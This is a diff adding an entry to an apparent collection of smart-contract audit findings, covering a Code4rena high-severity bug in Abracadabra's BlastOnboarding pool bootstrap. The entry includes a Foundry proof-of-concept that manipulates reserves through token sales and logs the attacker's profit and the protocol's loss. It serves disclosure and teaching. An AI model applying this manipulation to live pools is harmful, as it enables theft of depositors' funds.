@@ -333,3 +333,81 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 ```
 
 </details>
+
+## 8. [High] Users who deposited MIM and USDB tokens into BlastOnboarding may incur losses when the pool is created via bootstrap
+
+### Differences in token pair
+
+- Summary: BlastOnboarding's createPool function allows attackers to exploit differences in locked amounts of MIM and USDB tokens, leading to manipulation of token prices and potential fund theft. By strategically adjusting reserves through token sales, attackers can profit at the expense of other users.
+
+- Impact & Recommendation: Mitigation measures could include ensuring consistent reserves and targets for the initial depositor or implementing small swaps twice during pool creation to address this issue.
+
+<br> 🐬: [Source](https://code4rena.com/reports/2024-03-abracadabra-money#h-03-users-who-deposited-mim-and-usdb-tokens-into-blastonboarding-may-incur-losses-when-the-pool-is-created-via-bootstrap) & [Report](https://code4rena.com/reports/2024-03-abracadabra-money)
+
+<details><summary>POC</summary>
+
+```solidity
+    import {PMMPricing} from "/mimswap/libraries/PMMPricing.sol";
+    function testBenefitFromBoot() public {
+            uint256 mimLocked = 1000 ether;
+            uint256 usdbLocked = 3000 ether;
+            mim.mint(address(alice), mimLocked);
+            deal(address(weth), address(alice), usdbLocked);
+            vm.startPrank(alice);
+            mim.approve(address(router), mimLocked);
+            weth.approve(address(router), usdbLocked);
+            /**
+             * uint256 baseAmount = totals[MIM].locked;
+             * uint256 quoteAmount = totals[USDB].locked;
+             * (pool, totalPoolShares) = router.createPool(MIM, USDB, FEE_RATE, I, K, address(this), baseAmount, quoteAmount);
+             */
+            (address pool, ) = router.createPool(address(mim), address(weth), MIN_LP_FEE_RATE, 1 ether, 500000000000000, address(alice), mimLocked, usdbLocked);
+            MagicLP lp = MagicLP(pool);
+            vm.stopPrank();
+            console2.log("**** Starting state ****");
+            console2.log('base reserve    ==>  ', toolkit.formatDecimals(lp._BASE_RESERVE_()));
+            console2.log('base target     ==>  ', toolkit.formatDecimals(lp._BASE_TARGET_()));
+            console2.log('quote reserve   ==>  ', toolkit.formatDecimals(lp._QUOTE_RESERVE_()));
+            console2.log('quote target    ==>  ', toolkit.formatDecimals(lp._QUOTE_TARGET_()));
+            bool isForTesting = true;
+            uint256 wethForBob = 1000 ether;
+            if (isForTesting) {
+                deal(address(weth), address(bob), wethForBob);
+                vm.startPrank(bob);
+                weth.approve(address(router), wethForBob);
+                router.sellQuoteTokensForTokens(address(lp), bob, wethForBob, 0, type(uint256).max);
+                vm.stopPrank();
+            } else {
+                mim.mint(bob, 0.1 ether);
+                deal(address(weth), address(bob), 0.1 ether);
+                vm.startPrank(bob);
+                mim.approve(address(router), 0.1 ether);
+                router.sellBaseTokensForTokens(address(lp), bob, 0.1 ether, 0, type(uint256).max);
+                weth.approve(address(router), 0.1 ether);
+                router.sellQuoteTokensForTokens(address(lp), bob, 0.1 ether, 0, type(uint256).max);
+                vm.stopPrank();
+            }
+            console2.log("**** After selling the Quote token ****");
+            console2.log('base reserve    ==>  ', toolkit.formatDecimals(lp._BASE_RESERVE_()));
+            console2.log('base target     ==>  ', toolkit.formatDecimals(lp._BASE_TARGET_()));
+            console2.log('quote reserve   ==>  ', toolkit.formatDecimals(lp._QUOTE_RESERVE_()));
+            console2.log('quote target    ==>  ', toolkit.formatDecimals(lp._QUOTE_TARGET_()));
+            if (isForTesting) {
+                PMMPricing.PMMState memory state = lp.getPMMState();
+                console2.log("**** Prior to selling the Base token ****");
+                console2.log("changed base target   ==>  ", state.B0);
+                // Bob is going to sell state.B0 - state.B base tokens
+                uint256 mimForSell = state.B0 - state.B;
+                mim.mint(address(bob), mimForSell);
+                vm.startPrank(bob);
+                mim.approve(address(router), mimForSell);
+                router.sellBaseTokensForTokens(address(lp), bob, mimForSell, 0, type(uint256).max);
+                vm.stopPrank();
+                // Initially, Bob possesses wethForBob USDB and mimForSell MIM tokens
+                console2.log('Benefits for Bob  ==>  ', toolkit.formatDecimals(mim.balanceOf(bob) + weth.balanceOf(bob) - mimForSell - wethForBob));
+                // Users deposited usdbLocked USDB and mimLocked MIM tokens
+                console2.log('Loss of protocol  ==>  ', toolkit.formatDecimals(mimLocked + usdbLocked - mim.balanceOf(address(lp)) - weth.balanceOf(address(lp))));
+            }
+    }
+
+```
